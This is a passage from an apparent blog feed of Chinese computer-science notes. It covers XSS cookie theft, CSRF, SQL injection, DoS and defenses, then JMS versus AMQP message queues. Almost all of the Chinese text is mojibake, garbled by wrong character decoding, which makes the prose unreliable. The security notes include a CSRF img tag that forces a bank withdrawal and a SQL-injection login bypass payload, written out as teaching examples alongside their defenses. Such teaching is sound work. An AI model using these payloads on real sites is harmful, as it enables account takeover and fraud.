</code></pre></div><p>å¦ä¸€ä¸ªç”¨æˆ·æµè§ˆäº†å«æœ‰è¿™ä¸ªå†…å®¹çš„é¡µé¢å°†ä¼šè·³è½¬åˆ° domain.com å¹¶æºå¸¦äº†å½“å‰ä½œç”¨åŸŸçš„ Cookieã€‚å¦‚æœè¿™ä¸ªè®ºå›ç½‘ç«™é€šè¿‡ Cookie ç®¡ç†ç”¨æˆ·ç™»å½•çŠ¶æ€ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸ª Cookie ç™»å½•è¢«æ”»å‡»è€…çš„è´¦å·äº†ã€‚</p>
<h2 id="å±å®³" tabindex="-1"> å±å®³</h2>
<ul>
<li>çªƒå–ç”¨æˆ·çš„ Cookie</li>
<li>ä¼ªé€ è™šå‡çš„è¾“å…¥è¡¨å•éª—å–ä¸ªäººä¿¡æ¯</li>
<li>æ˜¾ç¤ºä¼ªé€ çš„æ–‡ç« æˆ–è€…å›¾ç‰‡</li>
</ul>
<h2 id="é˜²èŒƒæ‰‹æ®µ" tabindex="-1"> é˜²èŒƒæ‰‹æ®µ</h2>
<h3 id="_1-è®¾ç½®-cookie-ä¸º-httponly" tabindex="-1"> 1. è®¾ç½® Cookie ä¸º HttpOnly</h3>
<p>è®¾ç½®äº† HttpOnly çš„ Cookie å¯ä»¥é˜²æ­¢ JavaScript è„šæœ¬è°ƒç”¨ï¼Œå°±æ— æ³•é€šè¿‡ document.cookie è·å–ç”¨æˆ· Cookie ä¿¡æ¯ã€‚</p>
<h3 id="_2-è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦" tabindex="-1"> 2. è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦</h3>
<p>ä¾‹å¦‚å°† <code>&lt;</code> è½¬ä¹‰ä¸º <code>&amp;lt;</code>ï¼Œå°† <code>&gt;</code> è½¬ä¹‰ä¸º <code>&amp;gt;</code>ï¼Œä»è€Œé¿å… HTML å’Œ Jascript ä»£ç çš„è¿è¡Œã€‚</p>
<p>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨å…è®¸ç”¨æˆ·è¾“å…¥ HTML ä»£ç ï¼Œå°±ä¸èƒ½ç®€å•åœ°å°† <code>&lt;</code> ç­‰å­—ç¬¦è¿›è¡Œè¿‡æ»¤äº†ï¼Œæå¤§åœ°æé«˜äº† XSS æ”»å‡»çš„å¯èƒ½æ€§ã€‚</p>
<p>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨é€šå¸¸é‡‡ç”¨ XSS filter æ¥é˜²èŒƒ XSS æ”»å‡»ï¼Œé€šè¿‡å®šä¹‰ä¸€äº›æ ‡ç­¾ç™½åå•æˆ–è€…é»‘åå•ï¼Œä»è€Œä¸å…è®¸æœ‰æ”»å‡»æ€§çš„ HTML ä»£ç çš„è¾“å…¥ã€‚</p>
<p>ä»¥ä¸‹ä¾‹å­ä¸­ï¼Œform å’Œ script ç­‰æ ‡ç­¾éƒ½è¢«è½¬ä¹‰ï¼Œè€Œ h å’Œ p ç­‰æ ‡ç­¾å°†ä¼šä¿ç•™ã€‚</p>
<div><pre><code><span><span><span>&lt;</span>h1</span> <span>id</span><span><span>=</span><span>"</span>title<span>"</span></span><span>></span></span>XSS Demo<span><span><span>&lt;/</span>h1</span><span>></span></span>

<span><span><span>&lt;</span>p</span><span>></span></span>123<span><span><span>&lt;/</span>p</span><span>></span></span>

<span><span><span>&lt;</span>form</span><span>></span></span>
  <span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>"</span>text<span>"</span></span> <span>name</span><span><span>=</span><span>"</span>q<span>"</span></span> <span>value</span><span><span>=</span><span>"</span>test<span>"</span></span><span>></span></span>
<span><span><span>&lt;/</span>form</span><span>></span></span>

<span><span><span>&lt;</span>pre</span><span>></span></span>hello<span><span><span>&lt;/</span>pre</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>"</span>text/javascript<span>"</span></span><span>></span></span><span><span>
<span>alert</span><span>(</span><span><span>/</span><span>xss</span><span>/</span></span><span>)</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span><span><span>&lt;</span>h1</span><span>></span></span>XSS Demo<span><span><span>&lt;/</span>h1</span><span>></span></span>

<span><span><span>&lt;</span>p</span><span>></span></span>123<span><span><span>&lt;/</span>p</span><span>></span></span>

<span title="&lt;">&amp;lt;</span>form<span title="&gt;">&amp;gt;</span>
  <span title="&lt;">&amp;lt;</span>input type="text" name="q" value="test"<span title="&gt;">&amp;gt;</span>
<span title="&lt;">&amp;lt;</span>/form<span title="&gt;">&amp;gt;</span>

<span><span><span>&lt;</span>pre</span><span>></span></span>hello<span><span><span>&lt;/</span>pre</span><span>></span></span>

<span title="&lt;">&amp;lt;</span>script type="text/javascript"<span title="&gt;">&amp;gt;</span>
alert(/xss/);
<span title="&lt;">&amp;lt;</span>/script<span title="&gt;">&amp;gt;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><blockquote>
<p><a href="http://jsxss.com/zh/try.html" target="_blank" rel="noopener noreferrer">XSS è¿‡æ»¤åœ¨çº¿æµ‹è¯•</a></p>
</blockquote>
<h1 id="äºŒã€è·¨ç«™è¯·æ±‚ä¼ªé€ " tabindex="-1"> äºŒã€è·¨ç«™è¯·æ±‚ä¼ªé€ </h1>
<h2 id="æ¦‚å¿µ-1" tabindex="-1"> æ¦‚å¿µ</h2>
<p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-site request forgeryï¼ŒCSRFï¼‰ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ã€‚ç”±äºæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»æ‰§è¡Œã€‚</p>
<p>XSS åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·æµè§ˆå™¨çš„ä¿¡ä»»ã€‚</p>
<h2 id="æ”»å‡»åŸç†-1" tabindex="-1"> æ”»å‡»åŸç†</h2>
<p>å‡å¦‚ä¸€å®¶é“¶è¡Œç”¨ä»¥æ‰§è¡Œè½¬è´¦æ“ä½œçš„ URL åœ°å€å¦‚ä¸‹ï¼š</p>
<div><pre><code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeNameã€‚
</code></pre></div><p>é‚£ä¹ˆï¼Œä¸€ä¸ªæ¶æ„æ”»å‡»è€…å¯ä»¥åœ¨å¦ä¸€ä¸ªç½‘ç«™ä¸Šæ”¾ç½®å¦‚ä¸‹ä»£ç ï¼š</p>
<div><pre><code>&lt;img src="http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman">ã€‚
</code></pre></div><p>å¦‚æœæœ‰è´¦æˆ·åä¸º Alice çš„ç”¨æˆ·è®¿é—®äº†æ¶æ„ç«™ç‚¹ï¼Œè€Œå¥¹ä¹‹å‰åˆšè®¿é—®è¿‡é“¶è¡Œä¸ä¹…ï¼Œç™»å½•ä¿¡æ¯å°šæœªè¿‡æœŸï¼Œé‚£ä¹ˆå¥¹å°±ä¼šæŸå¤± 1000 ç¾å…ƒã€‚</p>
<p>è¿™ç§æ¶æ„çš„ç½‘å€å¯ä»¥æœ‰å¾ˆå¤šç§å½¢å¼ï¼Œè—èº«äºç½‘é¡µä¸­çš„è®¸å¤šåœ°æ–¹ã€‚æ­¤å¤–ï¼Œæ”»å‡»è€…ä¹Ÿä¸éœ€è¦æ§åˆ¶æ”¾ç½®æ¶æ„ç½‘å€çš„ç½‘ç«™ã€‚ä¾‹å¦‚ä»–å¯ä»¥å°†è¿™ç§åœ°å€è—åœ¨è®ºå›ï¼Œåšå®¢ç­‰ä»»ä½•ç”¨æˆ·ç”Ÿæˆå†…å®¹çš„ç½‘ç«™ä¸­ã€‚è¿™æ„å‘³ç€å¦‚æœæœåŠ¡å™¨ç«¯æ²¡æœ‰åˆé€‚çš„é˜²å¾¡æªæ–½çš„è¯ï¼Œç”¨æˆ·å³ä½¿è®¿é—®ç†Ÿæ‚‰çš„å¯ä¿¡ç½‘ç«™ä¹Ÿæœ‰å—æ”»å‡»çš„å±é™©ã€‚</p>
<p>é€šè¿‡ä¾‹å­èƒ½å¤Ÿçœ‹å‡ºï¼Œæ”»å‡»è€…å¹¶ä¸èƒ½é€šè¿‡ CSRF æ”»å‡»æ¥ç›´æ¥è·å–ç”¨æˆ·çš„è´¦æˆ·æ§åˆ¶æƒï¼Œä¹Ÿä¸èƒ½ç›´æ¥çªƒå–ç”¨æˆ·çš„ä»»ä½•ä¿¡æ¯ã€‚ä»–ä»¬èƒ½åšåˆ°çš„ï¼Œæ˜¯æ¬ºéª—ç”¨æˆ·æµè§ˆå™¨ï¼Œè®©å…¶ä»¥ç”¨æˆ·çš„åä¹‰æ‰§è¡Œæ“ä½œã€‚</p>
<h2 id="é˜²èŒƒæ‰‹æ®µ-1" tabindex="-1"> é˜²èŒƒæ‰‹æ®µ</h2>
<h3 id="_1-æ£€æŸ¥-referer-é¦–éƒ¨å­—æ®µ" tabindex="-1"> 1. æ£€æŸ¥ Referer é¦–éƒ¨å­—æ®µ</h3>
<p>Referer é¦–éƒ¨å­—æ®µä½äº HTTP æŠ¥æ–‡ä¸­ï¼Œç”¨äºæ ‡è¯†è¯·æ±‚æ¥æºçš„åœ°å€ã€‚æ£€æŸ¥è¿™ä¸ªé¦–éƒ¨å­—æ®µå¹¶è¦æ±‚è¯·æ±‚æ¥æºçš„åœ°å€åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ï¼Œå¯ä»¥æå¤§çš„é˜²æ­¢ CSRF æ”»å‡»ã€‚</p>
<p>è¿™ç§åŠæ³•ç®€å•æ˜“è¡Œï¼Œå·¥ä½œé‡ä½ï¼Œä»…éœ€è¦åœ¨å…³é”®è®¿é—®å¤„å¢åŠ ä¸€æ­¥æ ¡éªŒã€‚ä½†è¿™ç§åŠæ³•ä¹Ÿæœ‰å…¶å±€é™æ€§ï¼Œå› å…¶å®Œå…¨ä¾èµ–æµè§ˆå™¨å‘é€æ­£ç¡®çš„ Referer å­—æ®µã€‚è™½ç„¶ HTTP åè®®å¯¹æ­¤å­—æ®µçš„å†…å®¹æœ‰æ˜ç¡®çš„è§„å®šï¼Œä½†å¹¶æ— æ³•ä¿è¯æ¥è®¿çš„æµè§ˆå™¨çš„å…·ä½“å®ç°ï¼Œäº¦æ— æ³•ä¿è¯æµè§ˆå™¨æ²¡æœ‰å®‰å…¨æ¼æ´å½±å“åˆ°æ­¤å­—æ®µã€‚å¹¶ä¸”ä¹Ÿå­˜åœ¨æ”»å‡»è€…æ”»å‡»æŸäº›æµè§ˆå™¨ï¼Œç¯¡æ”¹å…¶ Referer å­—æ®µçš„å¯èƒ½ã€‚</p>
<h3 id="_2-æ·»åŠ æ ¡éªŒ-token" tabindex="-1"> 2. æ·»åŠ æ ¡éªŒ Token</h3>
<p>åœ¨è®¿é—®æ•æ„Ÿæ•°æ®è¯·æ±‚æ—¶ï¼Œè¦æ±‚ç”¨æˆ·æµè§ˆå™¨æä¾›ä¸ä¿å­˜åœ¨ Cookie ä¸­ï¼Œå¹¶ä¸”æ”»å‡»è€…æ— æ³•ä¼ªé€ çš„æ•°æ®ä½œä¸ºæ ¡éªŒã€‚ä¾‹å¦‚æœåŠ¡å™¨ç”Ÿæˆéšæœºæ•°å¹¶é™„åŠ åœ¨è¡¨å•ä¸­ï¼Œå¹¶è¦æ±‚å®¢æˆ·ç«¯ä¼ å›è¿™ä¸ªéšæœºæ•°ã€‚</p>
<h3 id="_3-è¾“å…¥éªŒè¯ç " tabindex="-1"> 3. è¾“å…¥éªŒè¯ç </h3>
<p>å› ä¸º CSRF æ”»å‡»æ˜¯åœ¨ç”¨æˆ·æ— æ„è¯†çš„æƒ…å†µä¸‹å‘ç”Ÿçš„ï¼Œæ‰€ä»¥è¦æ±‚ç”¨æˆ·è¾“å…¥éªŒè¯ç å¯ä»¥è®©ç”¨æˆ·çŸ¥é“è‡ªå·±æ­£åœ¨åšçš„æ“ä½œã€‚</p>
<h1 id="ä¸‰ã€sql-æ³¨å…¥æ”»å‡»" tabindex="-1"> ä¸‰ã€SQL æ³¨å…¥æ”»å‡»</h1>
<h2 id="æ¦‚å¿µ-2" tabindex="-1"> æ¦‚å¿µ</h2>
<p>æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“è¿è¡Œéæ³•çš„ SQL è¯­å¥ï¼Œä¸»è¦é€šè¿‡æ‹¼æ¥æ¥å®Œæˆã€‚</p>
<h2 id="æ”»å‡»åŸç†-2" tabindex="-1"> æ”»å‡»åŸç†</h2>
<p>ä¾‹å¦‚ä¸€ä¸ªç½‘ç«™ç™»å½•éªŒè¯çš„ SQL æŸ¥è¯¢ä»£ç ä¸ºï¼š</p>
<div><pre><code>strSQL <span>=</span> <span>"SELECT * FROM users WHERE (name = '"</span> <span>+</span> userName <span>+</span> <span>"') and (pw = '"</span><span>+</span> passWord <span>+</span><span>"');"</span>
</code></pre></div><p>å¦‚æœå¡«å…¥ä»¥ä¸‹å†…å®¹ï¼š</p>
<div><pre><code>userName <span>=</span> <span>"1' OR '1'='1"</span><span>;</span>
passWord <span>=</span> <span>"1' OR '1'='1"</span><span>;</span>
</code></pre></div><p>é‚£ä¹ˆ SQL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸ºï¼š</p>
<div><pre><code>strSQL <span>=</span> <span>"SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"</span>
</code></pre></div><p>æ­¤æ—¶æ— éœ€éªŒè¯é€šè¿‡å°±èƒ½æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ï¼š</p>
<div><pre><code>strSQL <span>=</span> <span>"SELECT * FROM users;"</span>
</code></pre></div><h2 id="é˜²èŒƒæ‰‹æ®µ-2" tabindex="-1"> é˜²èŒƒæ‰‹æ®µ</h2>
<h3 id="_1-ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢" tabindex="-1"> 1. ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢</h3>
<p>Java ä¸­çš„ PreparedStatement æ˜¯é¢„å…ˆç¼–è¯‘çš„ SQL è¯­å¥ï¼Œå¯ä»¥ä¼ å…¥é€‚å½“å‚æ•°å¹¶ä¸”å¤šæ¬¡æ‰§è¡Œã€‚ç”±äºæ²¡æœ‰æ‹¼æ¥çš„è¿‡ç¨‹ï¼Œå› æ­¤å¯ä»¥é˜²æ­¢ SQL æ³¨å…¥çš„å‘ç”Ÿã€‚</p>
<div><pre><code><span>PreparedStatement</span> stmt <span>=</span> connection<span>.</span><span>prepareStatement</span><span>(</span><span>"SELECT * FROM users WHERE userid=? AND password=?"</span><span>)</span><span>;</span>
stmt<span>.</span><span>setString</span><span>(</span><span>1</span><span>,</span> userid<span>)</span><span>;</span>
stmt<span>.</span><span>setString</span><span>(</span><span>2</span><span>,</span> password<span>)</span><span>;</span>
<span>ResultSet</span> rs <span>=</span> stmt<span>.</span><span>executeQuery</span><span>(</span><span>)</span><span>;</span>
</code></pre></div><h3 id="_2-å•å¼•å·è½¬æ¢" tabindex="-1"> 2. å•å¼•å·è½¬æ¢</h3>
<p>å°†ä¼ å…¥çš„å‚æ•°ä¸­çš„å•å¼•å·è½¬æ¢ä¸ºè¿ç»­ä¸¤ä¸ªå•å¼•å·ï¼ŒPHP ä¸­çš„ Magic quote å¯ä»¥å®Œæˆè¿™ä¸ªåŠŸèƒ½ã€‚</p>
<h1 id="å››ã€æ‹’ç»æœåŠ¡æ”»å‡»" tabindex="-1"> å››ã€æ‹’ç»æœåŠ¡æ”»å‡»</h1>
<p>æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆdenial-of-service attackï¼ŒDoSï¼‰ï¼Œäº¦ç§°æ´ªæ°´æ”»å‡»ï¼Œå…¶ç›®çš„åœ¨äºä½¿ç›®æ ‡ç”µè„‘çš„ç½‘ç»œæˆ–ç³»ç»Ÿèµ„æºè€—å°½ï¼Œä½¿æœåŠ¡æš‚æ—¶ä¸­æ–­æˆ–åœæ­¢ï¼Œå¯¼è‡´å…¶æ­£å¸¸ç”¨æˆ·æ— æ³•è®¿é—®ã€‚</p>
<p>åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆdistributed denial-of-service attackï¼ŒDDoSï¼‰ï¼ŒæŒ‡æ”»å‡»è€…ä½¿ç”¨ä¸¤ä¸ªæˆ–ä»¥ä¸Šè¢«æ”»é™·çš„ç”µè„‘ä½œä¸ºâ€œåƒµå°¸â€å‘ç‰¹å®šçš„ç›®æ ‡å‘åŠ¨â€œæ‹’ç»æœåŠ¡â€å¼æ”»å‡»ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener noreferrer">ç»´åŸºç™¾ç§‘ï¼šè·¨ç«™è„šæœ¬</a></li>
<li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noopener noreferrer">ç»´åŸºç™¾ç§‘ï¼šSQL æ³¨å…¥æ”»å‡»</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener noreferrer">ç»´åŸºç™¾ç§‘ï¼šè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ </a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noopener noreferrer">ç»´åŸºç™¾ç§‘ï¼šæ‹’ç»æœåŠ¡æ”»å‡»</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€JMS å’Œ AMQP</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€jms-å’Œ-amqp" tabindex="-1"> ä¸€ã€JMS å’Œ AMQP</h1>
<h2 id="jms" tabindex="-1"> JMS</h2>
<p>JMSï¼ˆJAVA Message Service,javaæ¶ˆæ¯æœåŠ¡ï¼‰æ˜¯javaçš„æ¶ˆæ¯æœåŠ¡ï¼ŒJMSçš„å®¢æˆ·ç«¯ä¹‹é—´å¯ä»¥é€šè¿‡JMSæœåŠ¡è¿›è¡Œå¼‚æ­¥çš„æ¶ˆæ¯ä¼ è¾“ã€‚<strong>JMSï¼ˆJAVA Message Serviceï¼ŒJavaæ¶ˆæ¯æœåŠ¡ï¼‰APIæ˜¯ä¸€ä¸ªæ¶ˆæ¯æœåŠ¡çš„æ ‡å‡†æˆ–è€…è¯´æ˜¯è§„èŒƒ</strong>ï¼Œå…è®¸åº”ç”¨ç¨‹åºç»„ä»¶åŸºäºJavaEEå¹³å°åˆ›å»ºã€å‘é€ã€æ¥æ”¶å’Œè¯»å–æ¶ˆæ¯ã€‚å®ƒä½¿åˆ†å¸ƒå¼é€šä¿¡è€¦åˆåº¦æ›´ä½ï¼Œæ¶ˆæ¯æœåŠ¡æ›´åŠ å¯é ä»¥åŠå¼‚æ­¥æ€§ã€‚</p>
<p><strong>ActiveMQ å°±æ˜¯åŸºäº JMS è§„èŒƒå®ç°çš„</strong></p>
<h3 id="jmsæ¶ˆæ¯æ¨¡å‹" tabindex="-1"> JMSæ¶ˆæ¯æ¨¡å‹</h3>
<h4 id="ç‚¹å¯¹ç‚¹-p2p" tabindex="-1"> ç‚¹å¯¹ç‚¹(P2P)</h4>
<p>æ¶ˆæ¯ç”Ÿäº§è€…å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­å‘é€äº†ä¸€ä¸ªæ¶ˆæ¯ä¹‹åï¼Œåªèƒ½è¢«ä¸€ä¸ªæ¶ˆè´¹è€…æ¶ˆè´¹ä¸€æ¬¡ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/206f965e-53b2-4732-90cf-75910b80d7ac.png" width="450px"/> </div><br>
<h4 id="å‘å¸ƒ-è®¢é˜…-pub-sub" tabindex="-1"> å‘å¸ƒ/è®¢é˜…(Pub/Sub)</h4>
<p>æ¶ˆæ¯ç”Ÿäº§è€…å‘é¢‘é“å‘é€ä¸€ä¸ªæ¶ˆæ¯ä¹‹åï¼Œå¤šä¸ªæ¶ˆè´¹è€…å¯ä»¥ä»è¯¥é¢‘é“è®¢é˜…åˆ°è¿™æ¡æ¶ˆæ¯å¹¶æ¶ˆè´¹ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4e93f7d4-2623-4129-a939-59051256561e.png" width="450px"/> </div><br>
<p>å‘å¸ƒä¸è®¢é˜…æ¨¡å¼å’Œè§‚å¯Ÿè€…æ¨¡å¼æœ‰ä»¥ä¸‹ä¸åŒï¼š</p>
<ul>
<li>è§‚å¯Ÿè€…æ¨¡å¼ä¸­ï¼Œè§‚å¯Ÿè€…å’Œä¸»é¢˜éƒ½çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ï¼›è€Œåœ¨å‘å¸ƒä¸è®¢é˜…æ¨¡å¼ä¸­ï¼Œç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…ä¸çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ï¼Œå®ƒä»¬ä¹‹é—´é€šè¿‡é¢‘é“è¿›è¡Œé€šä¿¡ã€‚</li>
<li>è§‚å¯Ÿè€…æ¨¡å¼æ˜¯åŒæ­¥çš„ï¼Œå½“äº‹ä»¶è§¦å‘æ—¶ï¼Œä¸»é¢˜ä¼šè°ƒç”¨è§‚å¯Ÿè€…çš„æ–¹æ³•ï¼Œç„¶åç­‰å¾…æ–¹æ³•è¿”å›ï¼›è€Œå‘å¸ƒä¸è®¢é˜…æ¨¡å¼æ˜¯å¼‚æ­¥çš„ï¼Œç”Ÿäº§è€…å‘é¢‘é“å‘é€ä¸€ä¸ªæ¶ˆæ¯ä¹‹åï¼Œå°±ä¸éœ€è¦å…³å¿ƒæ¶ˆè´¹è€…ä½•æ—¶å»è®¢é˜…è¿™ä¸ªæ¶ˆæ¯ï¼Œå¯ä»¥ç«‹å³è¿”å›ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/530764d5-f67f-47a2-8df4-57e8646e1400.png" width="450px"/> </div><br>
<h3 id="jmsæ¶ˆæ¯æ­£æ–‡" tabindex="-1"> JMSæ¶ˆæ¯æ­£æ–‡</h3>
<p>JMSå®šä¹‰äº†äº”ç§ä¸åŒçš„æ¶ˆæ¯æ­£æ–‡æ ¼å¼ï¼Œä»¥åŠè°ƒç”¨çš„æ¶ˆæ¯ç±»å‹ï¼Œå…è®¸ä½ å‘é€å¹¶æ¥æ”¶ä»¥ä¸€äº›ä¸åŒå½¢å¼çš„æ•°æ®ï¼Œæä¾›ç°æœ‰æ¶ˆæ¯æ ¼å¼çš„ä¸€äº›çº§åˆ«çš„å…¼å®¹æ€§ã€‚</p>
<ul>
<li>StreamMessage -- JavaåŸå§‹å€¼çš„æ•°æ®æµ</li>
<li>MapMessage--ä¸€å¥—åç§°-å€¼å¯¹</li>
<li>TextMessage--ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</li>
<li>ObjectMessage--ä¸€ä¸ªåºåˆ—åŒ–çš„ Javaå¯¹è±¡</li>
<li>BytesMessage--ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®æµ</li>
</ul>
<h2 id="amqp" tabindex="-1"> AMQP</h2>
<p>AMQPï¼Œå³Advanced Message Queuing Protocolï¼Œä¸€ä¸ªæä¾›ç»Ÿä¸€æ¶ˆæ¯æœåŠ¡çš„åº”ç”¨å±‚æ ‡å‡† <strong>é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®</strong>ï¼ˆäºŒè¿›åˆ¶åº”ç”¨å±‚åè®®ï¼‰ï¼Œæ˜¯åº”ç”¨å±‚åè®®çš„ä¸€ä¸ªå¼€æ”¾æ ‡å‡†,ä¸ºé¢å‘æ¶ˆæ¯çš„ä¸­é—´ä»¶è®¾è®¡ï¼Œå…¼å®¹ JMSã€‚åŸºäºæ­¤åè®®çš„å®¢æˆ·ç«¯ä¸æ¶ˆæ¯ä¸­é—´ä»¶å¯ä¼ é€’æ¶ˆæ¯ï¼Œå¹¶ä¸å—å®¢æˆ·ç«¯/ä¸­é—´ä»¶åŒäº§å“ï¼Œä¸åŒçš„å¼€å‘è¯­è¨€ç­‰æ¡ä»¶çš„é™åˆ¶ã€‚</p>
<p><strong>RabbitMQ å°±æ˜¯åŸºäº AMQP åè®®å®ç°çš„ã€‚</strong></p>
<h3 id="jms-vs-amqp" tabindex="-1"> JMS vs AMQP</h3>
<table>
<thead>
<tr>
<th>å¯¹æ¯”æ–¹å‘</th>
<th>JMS</th>
<th>AMQP</th>
</tr>
</thead>
<tbody>
<tr>
<td>å®šä¹‰</td>
<td>Java API</td>
<td>åè®®</td>
</tr>
<tr>
<td>è·¨è¯­è¨€</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>è·¨å¹³å°</td>
<td>å¦</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>æ¶ˆæ¯æ¨¡å‹</td>
<td>â‘ Peer-2-Peer;â‘¡Pub/sub</td>
<td>â‘ direct exchangeï¼›â‘¡fanout exchangeï¼›â‘¢topic changeï¼›â‘£headers exchangeï¼›â‘¤system exchangeã€‚</td>
</tr>
<tr>
<td>æ¶ˆæ¯ç±»å‹</td>
<td>æ”¯æŒå¤šç§æ¶ˆæ¯ç±»å‹</td>
<td>byte[]ï¼ˆäºŒè¿›åˆ¶ï¼‰</td>
</tr>
</tbody>
</table>
<p><strong>æ€»ç»“ï¼š</strong></p>
<ul>
<li>AMQP ä¸ºæ¶ˆæ¯å®šä¹‰äº†çº¿è·¯å±‚ï¼ˆwire-level protocolï¼‰çš„åè®®ï¼Œè€ŒJMSæ‰€å®šä¹‰çš„æ˜¯APIè§„èŒƒã€‚åœ¨ Java ä½“ç³»ä¸­ï¼Œå¤šä¸ªclientå‡å¯ä»¥é€šè¿‡JMSè¿›è¡Œäº¤äº’ï¼Œä¸éœ€è¦åº”ç”¨ä¿®æ”¹ä»£ç ï¼Œä½†æ˜¯å…¶å¯¹è·¨å¹³å°çš„æ”¯æŒè¾ƒå·®ã€‚è€ŒAMQPå¤©ç„¶å…·æœ‰è·¨å¹³å°ã€è·¨è¯­è¨€ç‰¹æ€§ã€‚</li>
<li>JMS æ”¯æŒTextMessageã€MapMessage ç­‰å¤æ‚çš„æ¶ˆæ¯ç±»å‹ï¼›è€Œ AMQP ä»…æ”¯æŒ byte[] æ¶ˆæ¯ç±»å‹ï¼ˆå¤æ‚çš„ç±»å‹å¯åºåˆ—åŒ–åå‘é€ï¼‰ã€‚</li>
